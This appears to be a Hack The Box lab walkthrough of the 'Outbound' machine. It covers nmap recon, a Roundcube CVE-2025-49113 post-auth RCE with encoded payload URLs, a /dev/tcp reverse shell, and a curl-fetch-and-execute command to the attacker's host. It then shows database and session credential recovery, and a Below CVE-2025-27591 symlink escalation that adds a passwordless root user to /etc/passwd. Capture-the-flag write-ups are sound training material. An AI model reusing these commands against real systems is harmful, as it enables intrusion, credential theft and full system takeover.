# Nmap
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Outbound]
└─$ nmap -sC -sV -Pn 10.10.11.77 -oN ./nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 23:56 AEST
Stats: 0:01:29 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 23:57 (0:00:00 remaining)
Nmap scan report for 10.10.11.77
Host is up (0.35s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 173.81 seconds
```
Add the domain `mail.outbound.htb` to our `/etc/hosts`
We have the credit of `tyler`
```
Machine Information

As is common in real life pentests, you will start the Outbound box with credentials for the following account tyler / LhKL1o9Nm3X2
```

# Page check
**mail.outbound.htb**
![](images/Pasted%20image%2020250714235902.png)
There is a version `Roundcube Webmail`
Let's google search what exploits could be included with that
![](images/Pasted%20image%2020250715000158.png)
There is a XSS vulner here.
And there is another Authenticated RCE here.
![](images/Pasted%20image%2020250715000336.png)
Then let's continue to check the poc of `CVE-2025-49113`
![](images/Pasted%20image%2020250715000836.png)
This blog from `Offsec` would be useful for us
`https://www.offsec.com/blog/cve-2025-49113/`
The exploit script is from `https://github.com/fearsoff-org/CVE-2025-49113`

# CVE-2025-49114
Let's exploit it with this scirpt
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Outbound/CVE-2025-49113]
└─$ php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "cat /etc/passwd"             
### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]

### Retrieving CSRF token and session cookie...

### Authenticating user: tyler

### Authentication successful

### Command to be executed: 
cat /etc/passwd

### Injecting payload...

### End payload: http://mail.outbound.htb//?_from=edit-%21%C9%22%C9%3B%C9i%C9%3A%C90%C9%3B%C9O%C9%3A%C91%C96%C9%3A%C9%22%C9C%C9r%C9y%C9p%C9t%C9_%C9G%C9P%C9G%C9_%C9E%C9n%C9g%C9i%C9n%C9e%C9%22%C9%3A%C91%C9%3A%C9%7B%C9S%C9%3A%C92%C96%C9%3A%C9%22%C9%5C%C90%C90%C9C%C9r%C9y%C9p%C9t%C9_%C9G%C9P%C9G%C9_%C9E%C9n%C9g%C9i%C9n%C9e%C9%5C%C90%C90%C9_%C9g%C9p%C9g%C9c%C9o%C9n%C9f%C9%22%C9%3B%C9S%C9%3A%C91%C97%C9%3A%C9%22%C9c%C9a%C9t%C9+%C9%2F%C9e%C9t%C9c%C9%2F%C9p%C9a%C9s%C9s%C9w%C9d%C9%3B%C9%23%C9%22%C9%3B%C9%7D%C9i%C9%3A%C90%C9%3B%C9b%C9%3A%C90%C9%3B%C9%7D%C9%22%C9%3B%C9%7D%C9%7D%C9&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload

### Payload injected successfully

### Executing payload...

### Exploit executed successfully

```

So let's get the reverse shell with this remote command execution
```
make a exploit.sh
/bin/bash -i >& /dev/tcp/10.10.14.16/443 0>&1

open your netcat to listen

┌──(wither㉿localhost)-[~/Templates/htb-labs/Outbound/CVE-2025-49113]
└─$ php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "curl 10.10.14.16/exploit.sh -o /tmp/wither.sh && chmod +x /tmp/wither.sh && /bin/bash -c /tmp/wither.sh"
### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]

### Retrieving CSRF token and session cookie...

### Authenticating user: tyler

### Authentication successful

### Command to be executed: 
curl 10.10.14.16/exploit.sh -o /tmp/wither.sh && chmod +x /tmp/wither.sh && /bin/bash -c /tmp/wither.sh

### Injecting payload...

### End payload: http://mail.outbound.htb//?_from=edit-%21%C0%22%C0%3B%C0i%C0%3A%C00%C0%3B%C0O%C0%3A%C01%C06%C0%3A%C0%22%C0C%C0r%C0y%C0p%C0t%C0_%C0G%C0P%C0G%C0_%C0E%C0n%C0g%C0i%C0n%C0e%C0%22%C0%3A%C01%C0%3A%C0%7B%C0S%C0%3A%C02%C06%C0%3A%C0%22%C0%5C%C00%C00%C0C%C0r%C0y%C0p%C0t%C0_%C0G%C0P%C0G%C0_%C0E%C0n%C0g%C0i%C0n%C0e%C0%5C%C00%C00%C0_%C0g%C0p%C0g%C0c%C0o%C0n%C0f%C0%22%C0%3B%C0S%C0%3A%C01%C00%C05%C0%3A%C0%22%C0c%C0u%C0r%C0l%C0+%C01%C00%C0%5C%C02%C0e%C01%C00%C0%5C%C02%C0e%C01%C04%C0%5C%C02%C0e%C01%C06%C0%2F%C0e%C0x%C0p%C0l%C0o%C0i%C0t%C0%5C%C02%C0e%C0s%C0h%C0+%C0-%C0o%C0+%C0%2F%C0t%C0m%C0p%C0%2F%C0w%C0i%C0t%C0h%C0e%C0r%C0%5C%C02%C0e%C0s%C0h%C0+%C0%26%C0%26%C0+%C0c%C0h%C0m%C0o%C0d%C0+%C0%2B%C0x%C0+%C0%2F%C0t%C0m%C0p%C0%2F%C0w%C0i%C0t%C0h%C0e%C0r%C0%5C%C02%C0e%C0s%C0h%C0+%C0%26%C0%26%C0+%C0%2F%C0b%C0i%C0n%C0%2F%C0b%C0a%C0s%C0h%C0+%C0-%C0c%C0+%C0%2F%C0t%C0m%C0p%C0%2F%C0w%C0i%C0t%C0h%C0e%C0r%C0%5C%C02%C0e%C0s%C0h%C0%3B%C0%23%C0%22%C0%3B%C0%7D%C0i%C0%3A%C00%C0%3B%C0b%C0%3A%C00%C0%3B%C0%7D%C0%22%C0%3B%C0%7D%C0%7D%C0&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload

### Payload injected successfully

### Executing payload...
```

Then we can get the reverse shell as `www-data`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Outbound/CVE-2025-49113]
└─$ nc -lnvp 443                               
listening on [any] 443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.77] 56434
bash: cannot set terminal process group (246): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail:/var/www/html/roundcube/public_html$ 
```

# Foothold to user
By check the ip address, I found we are in the docker environment.
```
www-data@mail:/var/www/html/roundcube/public_html$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether f2:9e:36:ec:ed:c5 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Let's enumerate the file system to find something interesting to help us get into other users.

From the `/var/www/html/roundcube/config`, we can get the file `config.inc.php`
```
$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

```
We can get the credit of database  `roundcube:RCDBPass2025`
Let's connect it to check the data in it.
```
mysql -u roundcube -p

use roundcube

Tables_in_roundcube
cache
cache_index
cache_messages
cache_shared
cache_thread
collected_addresses
contactgroupmembers
contactgroups
contacts
dictionary
filestore
identities
responses
searches
session
system
users

select * from users;
user_id username        mail_host       created last_login      failed_login    failed_login_counter    language        preferences
1       jacob   localhost       2025-06-07 13:55:18     2025-06-11 07:52:49     2025-07-14 04:22:25     1       en_US   a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}
2       mel     localhost       2025-06-08 12:04:51     2025-06-08 13:29:05     NULL    NULL    en_US   a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}
3       tyler   localhost       2025-06-08 13:28:55     2025-07-14 04:52:17     2025-07-14 04:37:55     1       en_US   a:2:{s:11:"client_hash";s:16:"32ItyPs4nmA1Shm8";i:0;b:0;}

Then we can find something ineresting from the session table

tyler@mail:/$ mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e 'use roundcube;select * from session;' -E
*************************** 1. row ***************************
sess_id: 6a5ktqih5uca6lj8vrmgh9v0oh
changed: 2025-06-08 15:46:40
     ip: 172.17.0.1
   vars: bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7

```
We can `Base64` decode them and find a password hash here `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/`
![](images/Pasted%20image%2020250715005409.png)
![](images/Pasted%20image%2020250716173425.png)

There is another `decrypt.sh` script in `/var/www/html/roundcube/bin/decrypt.sh` and we can get the cracked password
```
www-data@mail:/var/www/html/roundcube/bin$ ./decrypt.sh L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
</bin$ ./decrypt.sh L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
595mO8DmwGeD
```

Then we can get the credit of `jacob:595mO8DmwGeD` and we can switch to user `jacob` by `su jacob`

Firstly, we can check the email of `jacob` in `/home/jacob/mail/jacob`
```

From tyler@outbound.htb  Sat Jun  7 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
        id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-UID: 2                                        
Status: O

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler


From mel@outbound.htb  Sun Jun  8 12:09:45 2025
Return-Path: <mel@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1002)
        id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250608120945.1487E22C@outbound.htb>
Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
From: mel@outbound.htb
X-UID: 3                                        
Status: O

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel
```

Then we can use the credit `jacob:gY4Wr3a1evp4` to connect it by using `ssh`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Outbound/CVE-2025-49113]
└─$ ssh jacob@10.10.11.77                      
jacob@10.10.11.77's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Jul 13 11:33:04 PM UTC 2025

  System load:  0.0               Processes:             252
  Usage of /:   70.2% of 6.73GB   Users logged in:       1
  Memory usage: 12%               IPv4 address for eth0: 10.10.11.77
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Jul 13 23:33:05 2025 from 10.10.14.3
jacob@outbound:~$ 

```

# CVE-2025-27591
Firstly, I would like to check the `sudo -l`
```
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*

```
Then let's check the exploit with that
```
https://security.opensuse.org/2025/03/12/below-world-writable-log-dir.html
Below: World Writable Directory in /var/log/below Allows Local Privilege Escalation (CVE-2025-27591)
```

Then let's exploit it
```
Get the current user name and save it in the variable u.
u=$(id -un)

Delete the original log file and prepare to place the malicious symbolic link
rm -f /var/log/below/error_$u.log

Create a symbolic link to point the log file error_$u.log to the sensitive file /etc/passwd
ln -s /etc/passwd /var/log/below/error_$u.log

Construct a fake root user line with the username pwn, no password (two colons ::), UID and GID are both 0, that is, root authority.
echo 'pwn::0:0:root:/root:/bin/bash' > /tmp/pwn_entry

Write the malicious account to /etc/passwd (indirect writing through symbolic links).
cat /tmp/pwn_entry > /var/log/below/error_$u.log

Key step: execute the below command, which writes the log to /var/log/below/error_$u.log with root privileges. At this time, the attacker-controlled content is actually written to /etc/passwd.
sudo /usr/bin/below snapshot --begin now

Try to log in as root using the newly created pwn user (UID 0)
su pwn

The system /etc/passwd is overwritten, and a new user with UID 0 is added;
```

# Description
This Linux machine uses some of the latest vulnerabilities, but the symbolic link vulnerability used for privilege escalation will seriously damage the synchronous use of the machine. At the same time, when the foothold goes to the user, it directly skips the docker escape part. Overall, it is not a very interesting machine.